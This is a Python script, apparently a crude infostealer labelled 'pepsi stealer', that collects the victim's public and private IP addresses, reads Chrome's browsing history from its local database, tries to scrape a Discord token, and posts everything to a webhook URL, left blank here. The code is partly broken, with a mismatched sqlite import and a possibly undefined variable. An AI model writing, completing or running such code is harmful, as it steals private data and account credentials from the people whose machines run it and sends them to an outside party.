import os
import re
import json
import requests
from urllib.request import Request, urlopen
import sqlite

wh_url = "" # Too lazy
ip_url = "https://ipinfo.io/json"
base_url = "https://discord.com/channels/@me"
def main():
  # Call to the fuckin ip info url shit
  global ip_url
  req = Request(ip_url, headers={'User-Agent': 'Mozilla/5.0'})
  ipinfo = urlopen(req).read()
  ipinfo = json.loads(ipinfo)
  public_ip = ipinfo['ip']
  # Get private ip
  import socket

  def get_private_ip():
      private_ip = socket.gethostbyname(socket.gethostname())
      return private_ip

  private_ip = get_private_ip()



  
  # wait to see if tokens are found

  tokens=[]
  token=""
  


  try:

    try:
            full_path = os.environ['LOCALAPPDATA'] + "\\Google\\Chrome\\User Data\\Default\\" + "History"
            # Open with SQLite
            conn = sqlite3.connect(full_path)
            cursor = conn.cursor()
            # Print all tables in the database to figure out the table name as for its not urls
            # cursor.execute("SELECT name FROM sqlite_master WHERE type='table'")
            # Get links
            links = []
            for row in cursor.execute("SELECT url FROM urls"):
                links.append(row[0])
    except:
        pass

    # Get token 

    # Request base url
    response="      "

    req = Request(base_url, headers={'User-Agent': 'Mozilla/5.0'})
    response = str(urlopen(req).read())
    response=response.replace("_0xj.nonce = \\\'","BLINKER|||")
    response=response.split("BLINKER|||")
    response=response[1]
    response=response.replace("\\';_0xj","|||BLINKER")
    response=response.split("|||BLINKER")
    response=response[0]
    token=response
    #print(token)

    
  except Exception as e:
    print(e)
    pass
  
  embed={
    "username": "pepsi stealer",
    "content": f"**Public IP:** {public_ip} \n**Private IP:** {private_ip}  \n**Tokens:** {token} \n **Search History**: ```{links}```"
  }

  # Send via requests and webhook url
  requests.post(wh_url, data=embed)




if __name__ == '__main__':
    main()
